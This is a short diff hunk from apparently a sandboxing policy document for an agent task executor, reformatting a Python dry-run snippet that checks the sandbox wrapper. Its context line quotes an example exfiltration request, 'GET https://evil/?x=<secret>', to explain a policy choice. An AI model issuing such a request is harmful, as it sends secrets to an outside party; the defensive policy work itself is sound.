@@ -314,9 +314,12 @@ axis, because `GET https://evil/?x=<secret>` is exfiltration with a GET.
    period so pre-label leaks can be retired.
 5. Dry-run the wrap without spawning:
    ```python
-   import os; os.environ["MAC_OPENSHELL_SANDBOX"]="1"
-   os.environ["MAC_OPENSHELL_POLICY"]="/etc/mac/openshell-policy.yaml"
+   import os
+
+   os.environ["MAC_OPENSHELL_SANDBOX"] = "1"
+   os.environ["MAC_OPENSHELL_POLICY"] = "/etc/mac/openshell-policy.yaml"
    from mac import task_executor as te
+
    print(te._maybe_wrap_openshell(te._hermes_argv("hello")))
    ```
    Confirm it begins with `openshell sandbox create … --policy … --` and ends
